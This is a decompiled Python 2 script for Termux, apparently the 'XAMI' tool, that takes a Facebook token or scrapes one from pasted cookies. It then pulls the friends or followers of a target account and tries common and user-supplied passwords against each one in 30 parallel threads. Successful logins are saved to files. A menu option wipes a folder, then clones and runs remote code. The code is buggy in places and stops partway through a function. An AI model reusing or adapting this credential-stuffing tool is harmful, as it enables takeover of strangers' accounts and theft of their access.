# Decompiled By Xami King
# Github : https://github.com/Hacker474129
# uncompyle6 version 3.7.4
# Python bytecode 2.7
# Decompiled from: Python 2.7.18 (default, Mar 20 2021, 14:58:25) 
# [GCC 4.2.1 Compatible Android (6454773 based on r365631c2) Clang 9.0.8 (https:/
# Embedded file name: JAM-BACK
import os, sys, time, datetime, re, threading, json, random, requests, hashlib, cookielib, uuid
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
def clear():
    os.system('clear')
__author__ = 'XAMI'
__copyright = 'All rights reserved . Copyright  KACHI'
os.system('termux-setup-storage')
try:
    os.mkdir('/sdcard/ids')
except OSError:
    pass

bd = random.randint(20000000.0, 30000000.0)
sim = random.randint(20000, 40000)
header = {'x-fb-connection-bandwidth': repr(bd), 'x-fb-sim-hni': repr(sim), 'x-fb-net-hni': repr(sim), 
   'x-fb-connection-quality': 'EXCELLENT', 
   'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 
   'user-agent': 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]', 
   'content-type': 'application/x-www-form-urlencoded', 
   'x-fb-http-engine': 'Liger'}
os.system('git pull')
os.system('clear')


logo = """
\x1b[0;33;35m:::    :::     :::     ::::    ::::  ::::::::::: 
\x1b[0;33;35m:+:    :+:   :+: :+:   +:+:+: :+:+:+     :+:     
\x1b[0;33;37m+:+  +:+   +:+   +:+  +:+ +:+:+ +:+     +:+     
\x1b[0;33;37m +#++:+   +#++:++#++: +#+  +:+  +#+     +#+     
\x1b[0;33;38m +#+  +#+  +#+     +#+ +#+       +#+     +#+     Sarkar
\x1b[0;33;37m#+#    #+# #+#     #+# #+#       #+#     #+#     
\x1b[0;33;35m###    ### ###     ### ###       ### ########### 
 """                                                                       


def log_menu():
    try:
        t_check = open('access_token.txt', 'r')
        menu()
    except (KeyError, IOError):
        os.system('clear')
        print logo
        print '\x1b[0;37;40m ~~~~ LOGIN MENU ~~~~\x1b[0;37;40m'
        print 47 * '-'
        print '\x1b[0;37;40m[1] LOGIN WITH FACEBOOK'
        print '\x1b[0;37;40m[2] LOGIN WITH TOKEN'
        print '\x1b[0;37;40m[3] LOGIN WITH COOKIES'
        print ''
        log_menu_s()


def log_menu_s():
    s = raw_input(' \x1b[1;94m\xe2\x95\xb0\xe2\x94\x80Lofar\xe2\x9e\xa4 ')
    if s == '1':
        log_fb()
    elif s == '2':
        log_token()
    elif s == '3':
        log_cookie()
    else:
        print ''
        print '\\ Select valid option '
        print ''
        log_menu_s()


def log_fb():
    os.system('clear')
    print logo
    print '\x1b[0;37;40mLOGIN WITH ID/PASS'
    print 47 * '-'
    lid = raw_input('\x1b[1;92m ID/MAIL/NO: ')
    pwds = raw_input(' \x1b[1;93mPASSWORD: ')
    try:
        data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pwd).text
        q = json.loads(data)
        if 'loc' in q:
            ts = open('access_token.txt', 'w')
            ts.write(q['loc'])
            ts.close()
            menu()
        elif 'www.facebook.com' in q['error']:
            print ' USER MUST VERIFY ACCOUNT BEFORE LOGIN'
            raw_input('\x1b[1;92m Press enter to try again ')
            log_fb()
        else:
            print ' Id/PASS MAY BE WRONG'
            raw_input(' \x1b[1;92mPRESS ENTER TO TRY AGAIN ')
            log_fb()
    except:
        print ''
        print 'Exiting tool'
        os.system('exit')


def log_token():
    os.system('clear')
    print logo
    print '\x1b[1;93mLOGIN WITH TOKEN\x1b[1;91m'
    print 47 * '-'
    tok = raw_input(' \x1b[1;92mPASTE TOKEN HERE: \x1b[1;91m')
    print 47 * '-'
    t_s = open('access_token.txt', 'w')
    t_s.write(tok)
    t_s.close()
    menu()


def log_cookie():
    os.system('clear')
    print logo
    print ''
    print '\x1b[1;33;1mLOGIN COOKIES'
    print ''
    try:
        cookie = raw_input(' PASTE COOKIES HERE: ')
        data = {'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Kiwi Chrome/68.0.3438.0 Safari/537.36', 'referer': 'https://m.facebook.com/', 'host': 'm.facebook.com', 'origin': 'https://m.facebook.com', 
           'upgrade-insecure-requests': '1', 
           'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7', 
           'cache-control': 'max-age=0', 
           'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 
           'content-type': 'text/html; charset=utf-8', 
           'cookie': cookie}
        c1 = requests.get('https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_', headers=data)
        c2 = re.search('(EAAA\\w+)', c1.text)
        hasil = c2.group(1)
        ok = open('access_token.txt', 'w')
        ok.write(hasil)
        ok.close()
        menu()
    except AttributeError:
        print ''
        print '\tInvalid cookies'
        print ''
        raw_input(' \x1b[1;92mPRESS ENTER TO TRY AGAIN ')
        log_menu()
    except UnboundLocalError:
        print ''
        print '\tInvalid cookies'
        print ''
        raw_input(' \x1b[1;92mPRESS ENTER TO TRY AGAIN ')
        log_menu()
    except requests.exceptions.SSLError:
        print ''
        print '\tInvalid cookies'
        print ''
        raw_input(' \x1b[1;92mPRESS ENTER TO TRY AGAIN ')
        log_menu()


def menu():
    os.system('clear')
    try:
        token = open('access_token.txt', 'r').read()
    except (KeyError, IOError):
        print ''
        print logo
        print '\x1b[1;33;1mLOGIN FB ID TO CONTINUE'
        time.sleep(1)
        log_menu()

    try:
        r = requests.get('https://graph.facebook.com/me?access_token=' + token)
        q = json.loads(r.text)
        z = q['name']
    except (KeyError, IOError):
        print logo
        print ''
        print '\t Account Checkpoint\x1b[0;97m'
        print ''
        os.system('rm -rf access_token.txt')
        time.sleep(1)
        log_menu()
    except requests.exceptions.ConnectionError:
        print logo
        print ''
        print '\t Turn on mobile data/wifi\x1b[0;97m'
        print ''
        raw_input(' \x1b[1;92mPress enter after turning on mobile data/wifi ')
        menu()

    os.system('clear')
    print logo
    tok = open('access_token.txt', 'r').read()
    print '  \x1b[0;33;40mLOGGED IN USER: \x1b[0;32;40m' + z
    print 47 * '-'
    print ' \x1b[0;33;40m ACTIVE TOKEN: \x1b[0;32;40m' + tok
    print ' ------------------------------------------ '
    print '\x1b[0;37;40m[1] CRACK WITH AUTO PASSWORD 10'
    print ' ------------------------------------------ '
    print '\x1b[0;37;40m[2] CRACK WITH NUMBER PASSWORD 6'
    print ' ------------------------------------------ '
    print '\x1b[0;37;40m[3] CRACK WITH NAME + NUMBER PASSWORD 8'
    print ' ------------------------------------------ '
    print '\x1b[0;37;40m[4] LOGOUT'
    print ' ------------------------------------------ '
    print '\x1b[0;37;40m[5] DELETE TRASH FILES'
    print ' ------------------------------------------ '
    menu_s()


def menu_s():
    ms = raw_input('\x1b[1;97m\xe2\x95\xb0\xe2\x94\x80XAMI\xe2\x9e\xa4 ')
    if ms == '1':
        auto_crack()
    elif ms == '2':
        choice_crack()
    elif ms == '3':
        name_crack()
    elif ms == '4':
        lout()
    elif ms == '5':
        clear()
        print logo
        os.system("rm -rf $HOME/XAMI")
        os.system("pip install lolcat")
        os.system("cd $HOME && git clone https://github.com/TERmuxkiler/XAMI")
        print logo
        ms("\033[1;96mCongratulations XAMI Tool Has Been Update Successfully")
        time.sleep(5)
        os.system("cd $HOME/XAMI && python2 Xami.py")
    else:
        print ''
        print '\tSelect valid option'
        print ''
        menu_s()


def crack():
    global toket
    try:
        toket = open('login.txt', 'r').read()
    except (KeyError, IOError):
        os.system('clear')
        print logo
        print '\t File Not Found \x1b[0;97m'
        print ''
        time.sleep(1)
        log_menu()

    os.system('clear')
    print logo
    print '\x1b[0;33;40m--- AUTO PASS CRACKING ---\x1b[0;33;40m'
    print 47 * '-'
    print '\x1b[0;37;40m[1] PUBLIC ID CLONING'
    print '\x1b[0;37;40m[2] FOLLOWERS ID CLONING'
    print '\x1b[0;37;40m[3] FILE CLONING'
    print '\x1b[0;33;40m[0] BACK'
    a_s()


def auto_crack():
    global token
    try:
        token = open('access_token.txt', 'r').read()
    except (KeyError, IOError):
        os.system('clear')
        print logo
        print '\t Login FB id to continue\x1b[0;97m'
        print ''
        time.sleep(1)
        log_menu()

    os.system('clear')
    print logo
    print '\x1b[0;33;40m--- AUTO PASS CRACKING ---\x1b[0;33;40m'
    print 47 * '-'
    print '\x1b[0;37;40m[1] PUBLIC ID CLONING'
    print '\x1b[0;37;40m[2] FOLLOWERS ID CLONING'
    print '\x1b[0;37;40m[3] FILE CLONING'
    print '\x1b[0;33;40m[0] BACK'
    a_s()


def a_s():
    id = []
    cps = []
    oks = []
    a_s = raw_input(' \x1b[1;97m\xe2\x95\xb0\xe2\x94\x80XAMI\xe2\x9e\xa4 ')
    if a_s == '1':
        os.system('clear')
        print logo
        print '\x1b[0;33;40m--- AUTO PASS PUBLIC CRACKING ---\x1b[0;33;40m'
        print 47 * '-'
        idt = raw_input(' \x1b[1;93m[\xe2\x98\x85] ENTER ID: ')
        try:
            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
            q = json.loads(r.text)
            z = q['name']
            os.system('clear')
            print logo
            print '\x1b[0;33;40m--- AUTO PASS PUBLIC CRACKING ---'
            print ' \x1b[1;92mCloning from: ' + z
        except (KeyError, IOError):
            print '\t INVALID USER \x1b[0;97m'
            raw_input(' \x1b[1;92mPRESS ENTER TO TRY AGAIN ')
            auto_crack()

        r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + token)
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)

    elif a_s == '2':
        os.system('clear')
        print logo
        print '\x1b[0;33;40m--- NAME PASS FOLLOWERS CRACKING ---\x1b[0;33;40m'
        print 47 * '-'
        print ' \x1b[0;37;40mFOR EXAMPLE:123,1234,12345,786,12,1122\x1b[0;37;40'
        print 47 * '-'
        p1 = raw_input(' \x1b[0;37;40m[1] NAME + DIGIT: ')
        p2 = raw_input(' \x1b[0;37;40m[2] NAME + DIGIT: ')
        p3 = raw_input(' \x1b[0;37;40m[3] NAME + DIGIT: ')
        p4 = raw_input(' \x1b[0;37;40m[4] NAME + DIGIT: ')
        idt = raw_input(' \x1b[0;33;40m[\xe2\x98\x85] ENTER ID: ')
        try:
            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
            q = json.loads(r.text)
            z = q['name']
            os.system('clear')
            print logo
            print '\x1b[0;33;40m--- NAME PASS FOLLOWERS CRACKING ---'
            print ' \x1b[1;92mCloning from: ' + z
        except (KeyError, IOError):
            print '\t INVALID USER \x1b[0;97m'
            raw_input('\x1b[1;92mPRESS ENTER TO TRY AGAIN ')
            auto_crack()

        r = requests.get('https://graph.facebook.com/' + idt + '/subscribers?access_token=' + token + '&limit=999999')
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)

    elif a_s == '3':
        os.system('clear')
        print logo
        print '\x1b[0;33;40m--- AUTO PASS FILE CRACKING ---\x1b[0;33;40m'
        print 47 * '-'
        try:
            idlist = raw_input('[+] File Name: ')
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] FILE NOT FOUND.'
            raw_input('PRESS ENTER TO BACK. ')
            crack()

    elif a_s == '0':
        menu()
    else:
        print ''
        print '\tChoose valid option' + w
        a_s()
    print ' Total ids: ' + str(len(id))
    time.sleep(0.5)
    print ' \x1b[0;37;40mCRACK RUNNING\x1b[0;37;40m '
    time.sleep(0.5)
    print 47 * '-'
    print '\t\x1b[0;36;40m[XAMI]\x1b[0;36;40m'
    print 47 * '-'

    def main(arg):
        user = arg
        uid, name = user.split('|')
        try:
            pass1 = name.lower() + '12345'
            data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass1, headers=header).text
            q = json.loads(data)
            if 'loc' in q:
                print '\x1b[0;32;40m[XAMI-OK] \x1b[1;32m' + uid + ' | ' + pass1 + '\x1b[0;97m'
                ok = open('/sdcard/ids/XAMI_OK.txt', 'a')
                ok.write(uid + ' | ' + pass1 + '\n')
                ok.close()
                oks.append(uid + pass1)
            elif 'www.facebook.com' in q['error']:
                print '\x1b[0;36;40m[XAMI-CP] ' + uid + ' | ' + pass1
                cp = open('XAMI_CP.txt', 'a')
                cp.write(uid + ' | ' + pass1 + '\n')
                cp.close()
                cps.append(uid + pass1)
            else:
                pass2 = name.lower() + '1234'
                data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass2, headers=header).text
                q = json.loads(data)
                if 'loc' in q:
                    print '\x1b[0;32;40m[XAMI-OK] \x1b[1;32m' + uid + ' | ' + pass2 + '\x1b[0;97m'
                    ok = open('/sdcard/ids/XAMI_OK.txt', 'a')
                    ok.write(uid + ' | ' + pass2 + '\n')
                    ok.close()
                    oks.append(uid + pass2)
                elif 'www.facebook.com' in q['error']:
                    print '\x1b[0;36;40m[XAMI-CP]' + uid + ' | ' + pass2
                    cp = open('XAMI_CP.txt', 'a')
                    cp.write(uid + ' | ' + pass2 + '\n')
                    cp.close()
                    cps.append(uid + pass2)
                else:
                    pass3 = name.lower() + '786'
                    data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass3, headers=header).text
                    q = json.loads(data)
                    if 'loc' in q:
                        print '\x1b[0;32;40m[XAMI-OK] \x1b[1;32m' + uid + ' | ' + pass3 + '\x1b[0;97m'
                        ok = open('/sdcard/ids/XAMI_OK.txt', 'a')
                        ok.write(uid + ' | ' + pass3 + '\n')
                        ok.close()
                        oks.append(uid + pass3)
                    elif 'www.facebook.com' in q['error']:
                        print '\x1b[0;36;40m[XAMI-CP] ' + uid + ' | ' + pass3
                        cp = open('XAMI_CP.txt', 'a')
                        cp.write(uid + ' | ' + pass3 + '\n')
                        cp.close()
                        cps.append(uid + pass3)
                    else:
                        pass4 = name.lower() + '123'
                        data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass4, headers=header).text
                        q = json.loads(data)
                        if 'loc' in q:
                            print '\x1b[0;32;40m[XAMI-OK] \x1b[1;32m' + uid + ' | ' + pass4 + '\x1b[0;97m'
                            ok = open('/sdcard/ids/XAMI_OK.txt', 'a')
                            ok.write(uid + ' | ' + pass4 + '\n')
                            ok.close()
                            oks.append(uid + pass4)
                        elif 'www.facebook.com' in q['error']:
                            print '\x1b[0;36;40m[XAMI-CP] ' + uid + ' | ' + pass4
                            cp = open('XAMI_CP.txt', 'a')
                            cp.write(uid + ' | ' + pass4 + '\n')
                            cp.close()
                            cps.apppend(uid + pass4)
                        else:
                            pass5 = '223344'
                            data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass5, headers=header).text
                            q = json.loads(data)
                            if 'loc' in q:
                                print '\x1b[0;32;40m[XAMI-OK] \x1b[1;32m' + uid + ' | ' + pass5 + '\x1b[0;97m'
                                ok = open('/sdcard/ids/XAMI_OK.txt', 'a')
                                ok.write(uid + ' | ' + pass5 + '\n')
                                ok.close()
                                oks.append(uid + pass5)
                            elif 'www.facebook.com' in q['error']:
                                print '\x1b[0;36;40m[XAMI-CP] ' + uid + ' | ' + pass5
                                cp = open('XAMI_CP.txt', 'a')
                                cp.write(uid + ' | ' + pass5 + '\n')
                                cp.close()
                                cps.apppend(uid + pass5)
                            else:
                                pass6 = '334455'
                                data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass6, headers=header).text
                                q = json.loads(data)
                                if 'loc' in q:
                                    print '\x1b[0;32;40m[XAMI-OK] \x1b[1;32m' + uid + ' | ' + pass6 + '\x1b[0;97m'
                                    ok = open('/sdcard/ids/LOFAR_OK.txt', 'a')
                                    ok.write(uid + ' | ' + pass6 + '\n')
                                    ok.close()
                                    oks.append(uid + pass6)
                                elif 'www.facebook.com' in q['error']:
                                    print '\x1b[0;36;40m[XAMI-CP] ' + uid + ' | ' + pass6
                                    cp = open('XAMI_CP.txt', 'a')
                                    cp.write(uid + ' | ' + pass6 + '\n')
                                    cp.close()
                                    cps.apppend(uid + pass6)
                                else:
                                    pass7 = '445566'
                                    data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass7, headers=header).text
                                    q = json.loads(data)
                                    if 'loc' in q:
                                        print '\x1b[0;32;40m[XAMI-OK] \x1b[1;32m' + uid + ' | ' + pass7 + '\x1b[0;97m'
                                        ok = open('/sdcard/ids/XAMI_OK.txt', 'a')
                                        ok.write(uid + ' | ' + pass7 + '\n')
                                        ok.close()
                                        oks.append(uid + pass7)
                                    elif 'www.facebook.com' in q['error']:
                                        print '\x1b[0;36;40m[XAMI-CP] ' + uid + ' | ' + pass7
                                        cp = open('XAMI_CP.txt', 'a')
                                        cp.write(uid + ' | ' + pass7 + '\n')
                                        cp.close()
                                        cps.apppend(uid + pass7)
                                    else:
                                        pass8 = 'pakistan'
                                        data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass8, headers=header).text
                                        q = json.loads(data)
                                        if 'loc' in q:
                                            print '\x1b[0;32;40m[XAMI-OK] \x1b[1;32m' + uid + ' | ' + pass8 + '\x1b[0;97m'
                                            ok = open('/sdcard/ids/XAMI_OK.txt', 'a')
                                            ok.write(uid + ' | ' + pass8 + '\n')
                                            ok.close()
                                            oks.append(uid + pass8)
                                        elif 'www.facebook.com' in q['error']:
                                            print '\x1b[0;36;40m[XAMI-CP] ' + uid + ' | ' + pass8
                                            cp = open('XAMI_CP.txt', 'a')
                                            cp.write(uid + ' | ' + pass8 + '\n')
                                            cp.close()
                                            cps.apppend(uid + pass8)
                                        else:
                                            pass9 = '1234567'
                                            data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass9, headers=header).text
                                            q = json.loads(data)
                                            if 'loc' in q:
                                                print '\x1b[0;32;40m[XAMI-OK] \x1b[1;32m' + uid + ' | ' + pass9 + '\x1b[0;97m'
                                                ok = open('/sdcard/ids/XAMI_OK.txt', 'a')
                                                ok.write(uid + ' | ' + pass9 + '\n')
                                                ok.close()
                                                oks.append(uid + pass9)
                                            elif 'www.facebook.com' in q['error']:
                                                print '\x1b[0;36;40m[XAMI-CP] ' + uid + ' | ' + pass9
                                                cp = open('XAMI_CP.txt', 'a')
                                                cp.write(uid + ' | ' + pass9 + '\n')
                                                cp.close()
                                                cps.apppend(uid + pass9)
                                            else:
                                                pass10 = '786000'
                                                data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass10, headers=header).text
                                                q = json.loads(data)
                                                if 'loc' in q:
                                                    print '\x1b[0;32;40m[XAMI-OK] \x1b[1;32m' + uid + ' | ' + pass10 + '\x1b[0;97m'
                                                    ok = open('/sdcard/ids/XAMI_OK.txt', 'a')
                                                    ok.write(uid + ' | ' + pass10 + '\n')
                                                    ok.close()
                                                    oks.append(uid + pass10)
                                                elif 'www.facebook.com' in q['error']:
                                                    print '\x1b[0;36;40m[XAMI-CP] ' + uid + ' | ' + pass10
                                                    cp = open('XAMI_CP.txt', 'a')
                                                    cp.write(uid + ' | ' + pass10 + '\n')
                                                    cp.close()
                                                    cps.apppend(uid + pass10)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print 47 * '-'
    print ' \x1b[0;33;40mCRACK DONE'
    print ' \x1b[0;33;40mTOTAL OK/CP:' + str(len(oks)) + '/' + str(len(cps))
    print 47 * '-'
    raw_input(' \x1b[0;33;40mPRESS ENTER TO BACK')
    auto_crack()


def crack_b():
    global toket
    try:
        toket = open('login.txt', 'r').read()
    except (KeyError, IOError):
        os.system('clear')
        print logo
        print '\t File Not Found \x1b[0;97m'
        time.sleep(1)
        log_menu()

    os.system('clear')
    print logo
    print '\x1b[0;33;40m--- NAME PASS CRACKING ---\x1b[0;33;40m'
    print 47 * '-'
    print '\x1b[0;37;40m[1] PUBLIC ID CLONING'
    print '\x1b[0;37;40m[2] FOLLOWERS ID CLONING'
    print '\x1b[0;37;40m[3] FILE CLONING'
    print '\x1b[0;33;40m[0] BACK'
    c_s()


def choice_crack():
    global token
    try:
        token = open('access_token.txt', 'r').read()
    except (KeyError, IOError):
        os.system('clear')
        print logo
        print '\x1b[1;93m--- LOGIN FB ID TO CONTINUE ---'
        time.sleep(1)
        log_menu()

    os.system('clear')
    print logo
    print '\x1b[0;33;40m--- NAME PASS CRACKING ---\x1b[0;33;40m'
    print 47 * '-'
    print '\x1b[0;37;40m[1] PUBLIC ID CLONING'
    print '\x1b[0;37;40m[2] FOLLOWERS ID CLONING'
    print '\x1b[0;37;40m[3] FILE CLONING'
    print '\x1b[0;33;40m[0] BACK'
    c_s()


def c_s():
    id = []
    cps = []
    oks = []
    a_s = raw_input(' \x1b[1;97m\xe2\x95\xb0\xe2\x94\x80XAMI\xe2\x9e\xa4 ')
    if a_s == '1':
        os.system('clear')
        print logo
        print '\x1b[0;33;40m--- NUMBER PASS PUBLIC CRACKING ---\x1b[0;33;40m'
        print 47 * '-'
        print ' \x1b[0;37;40mFOR EXAMPLE:234567,223344,334455,445566\x1b[0;37;40'
        print 47 * '-'
        pass1 = raw_input(' \x1b[0;37;40m[1] PASSWORD: ')
        pass2 = raw_input(' \x1b[0;37;40m[2] PASSWORD: ')
        pass3 = raw_input(' \x1b[0;37;40m[3] PASSWORD: ')
        pass4 = raw_input(' \x1b[0;37;40m[4] PASSWORD: ')
        pass5 = raw_input(' \x1b[0;37;40m[5] PASSWORD: ')
        pass6 = raw_input(' \x1b[0;37;40m[6] PASSWORD: ')
        idt = raw_input(' \x1b[0;33;40m[\xe2\x98\x85]Enter id: ')
        try:
            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
            q = json.loads(r.text)
            z = q['name']
            os.system('clear')
            print logo
            print '\x1b[0;33;40m--- NUMBER PASS PUBLIC CRACKING ---'
            print ' Cloning from: ' + z
        except (KeyError, IOError):
            print '\t INVALID USER \x1b[0;97m'
            raw_input(' Press ENTER TO TRY AGAIN ')
            choice_crack()

        r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + token)
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)

    elif a_s == '2':
        os.system('clear')
        print logo
        print '\x1b[0;33;40m--- NUMBER PASS FOLLOWERS CRACKING ---\x1b[0;33;40m'
        print 47 * '-'
        print '\x1b[0;37;40m FOR EXAMPLE:234567,223344,334455,445566\x1b[1;91m'
        print 47 * '-'
        pass1 = raw_input(' \x1b[0;37;40m[1] PASSWORD: ')
        pass2 = raw_input(' \x1b[0;37;40m[2] PASSWORD: ')
        pass3 = raw_input(' \x1b[0;37;40m[3] PASSWORD: ')
        pass4 = raw_input(' \x1b[0;37;40m[4] PASSWORD: ')
        idt = raw_input(' \x1b[0;33;40mENTER ID: ')
        try:
            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
            q = json.loads(r.text)
            z = q['name']
            os.system('clear')
            print logo
            print '\x1b[0;33;40m--- NUMBER PASS FOLLOWERS CRACKING ---'
            print ' Cloning from: ' + z
        except (KeyError, IOError):
            print '\t Invalid user \x1b[0;97m'
            raw_input('PENTER TO TRY AGAIN ')
            auto_crack()

        r = requests.get('https://graph.facebook.com/' + idt + '/subscribers?access_token=' + token + '&limit=999999')
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)

    elif a_s == '3':
        os.system('clear')
        print logo
        print '\x1b[0;33;40m--- NUMBER PASS FILE CRACKING ---\x1b[0;33;40m'
        print 47 * '-'
        print ' \x1b[0;37;40mFOR EXAMPLE:234567,223344,334455,445566\x1b[0;37;40m'
        print 47 * '-'
        pass1 = raw_input(' \x1b[0;37;40m[1] PASSWORD: ')
        pass2 = raw_input(' \x1b[0;37;40m[2] PASSWORD: ')
        pass3 = raw_input(' \x1b[0;37;40m[3] PASSWORD: ')
        pass4 = raw_input(' \x1b[0;37;40m[4] PASSWORD: ')
        pass5 = raw_input(' \x1b[0;37;40m[5] PASSWORD: ')
        pass6 = raw_input(' \x1b[0;37;40m[6] PASSWORD: ')
        try:
            idlist = raw_input('[+] File Name: ')
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] File Not Found.'
            raw_input('PRESS ENTER TO BACK. ')
            crack_b()

    elif a_s == '0':
        menu()
    else:
        print ''
        print '\t Choose valid option' + w
        c_s()
    print ' Total ids: ' + str(len(id))
    time.sleep(0.5)
    print ' \x1b[0;37;40mCRACK RUNNING\x1b[0;37;40m '
    time.sleep(0.5)
    print 47 * '-'
    print '\t\x1b[0;36;40m[XAMI]\x1b[0;36;40m'
    print 47 * '-'

    def main(arg):
        user = arg
        uid, name = user.split('|')
        try:
            data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass1, headers=header).text
            q = json.loads(data)
            if 'loc' in q:
                print '\x1b[0;32;40m[X-OK] \x1b[1;32m' + uid + ' | ' + pass1 + '\x1b[0;97m'
                ok = open('/sdcard/ids/X_OK.txt', 'a')
                ok.write(uid + ' | ' + pass1 + '\n')
                ok.close()
                oks.append(uid + pass1)
            elif 'www.facebook.com' in q['error']:
                print '\x1b[0;36;40m[X-CP] ' + uid + ' | ' + pass1
                cp = open('X_CP.txt', 'a')
                cp.write(uid + ' | ' + pass1 + '\n')
                cp.close()
                cps.append(uid + pass1)
            else:
                data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass2, headers=header).text
                q = json.loads(data)
                if 'loc' in q:
                    print '\x1b[0;32;40m[X-OK] \x1b[1;32m' + uid + ' | ' + pass2 + '\x1b[0;97m'
                    ok = open('/sdcard/ids/X_OK.txt', 'a')
                    ok.write(uid + ' | ' + pass2 + '\n')
                    ok.close()
                    oks.append(uid + pass2)
                elif 'www.facebook.com' in q['error']:
                    print '\x1b[0;36;40m[X-CP] ' + uid + ' | ' + pass2
                    cp = open('X_CP.txt', 'a')
                    cp.write(uid + ' | ' + pass2 + '\n')
                    cp.close()
                    cps.append(uid + pass2)
                else:
                    data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass3, headers=header).text
                    q = json.loads(data)
                    if 'loc' in q:
                        print '\x1b[0;32;40m[X-OK] \x1b[1;32m' + uid + ' | ' + pass3 + '\x1b[0;97m'
                        ok = open('/sdcard/ids/X_OK.txt', 'a')
                        ok.write(uid + ' | ' + pass3 + '\n')
                        ok.close()
                        oks.append(uid + pass3)
                    elif 'www.facebook.com' in q['error']:
                        print '\x1b[0;36;40m[X-CP] ' + uid + ' | ' + pass3
                        cp = open('X_CP.txt', 'a')
                        cp.write(uid + ' | ' + pass3 + '\n')
                        cp.close()
                        cps.append(uid + pass3)
                    else:
                        data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass4, headers=header).text
                        q = json.loads(data)
                        if 'loc' in q:
                            print '\x1b[0;32;40m[X-OK] \x1b[1;32m' + uid + ' | ' + pass4 + '\x1b[0;97m'
                            ok = open('/sdcard/ids/X_OK.txt', 'a')
                            ok.write(uid + ' | ' + pass4 + '\n')
                            ok.close()
                            oks.append(uid + pass4)
                        elif 'www.facebook.com' in q['error']:
                            print '\x1b[0;36;40m[X-CP] ' + uid + ' | ' + pass4
                            cp = open('X_CP.txt', 'a')
                            cp.write(uid + ' | ' + pass4 + '\n')
                            cp.close()
                            cps.apppend(uid + pass4)
                        else:
                            data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass5, headers=header).text
                            q = json.loads(data)
                            if 'loc' in q:
                                print '\x1b[0;32;40m[X-OK] \x1b[1;32m' + uid + ' | ' + pass5 + '\x1b[0;97m'
                                ok = open('/sdcard/ids/X_OK.txt', 'a')
                                ok.write(uid + ' | ' + pass5 + '\n')
                                ok.close()
                                oks.append(uid + pass5)
                            elif 'www.facebook.com' in q['error']:
                                print '\x1b[0;36;40m[X-CP] ' + uid + ' | ' + pass5
                                cp = open('X_CP.txt', 'a')
                                cp.write(uid + ' | ' + pass5 + '\n')
                                cp.close()
                                cps.apppend(uid + pass5)
                            else:
                                data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass6, headers=header).text
                                q = json.loads(data)
                                if 'loc' in q:
                                    print '\x1b[0;32;40m[X-OK] \x1b[1;32m' + uid + ' | ' + pass6 + '\x1b[0;97m'
                                    ok = open('/sdcard/ids/X_OK.txt', 'a')
                                    ok.write(uid + ' | ' + pass6 + '\n')
                                    ok.close()
                                    oks.append(uid + pass6)
                                elif 'www.facebook.com' in q['error']:
                                    print '\x1b[0;36;40m[X-CP] ' + uid + ' | ' + pass6
                                    cp = open('X_CP.txt', 'a')
                                    cp.write(uid + ' | ' + pass6 + '\n')
                                    cp.close()
                                    cps.apppend(uid + pass6)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print 47 * '-'
    print ' \x1b[0;36;40m CRACK DONE'
    print '\x1b[0;36;40m TOTAL OK/CP:' + str(len(oks)) + '/' + str(len(cps))
    print 47 * '-'
    raw_input('\x1b[0;36;40m PRESS ENTER TO BACK')
    choice_crack()


def crack_b():
    global toket
    try:
        toket = open('login.txt', 'r').read()
    except (KeyError, IOError):
        os.system('clear')
        print logo
        print '\t File Not Found \x1b[0;97m'
        print ''
        time.sleep(1)
        log_menu()

    os.system('clear')
    print logo
    print '\x1b[0;33;40m--- NAME + NUMBER PASS CRACKING ---\x1b[0;33;40m'
    print 47 * '-'
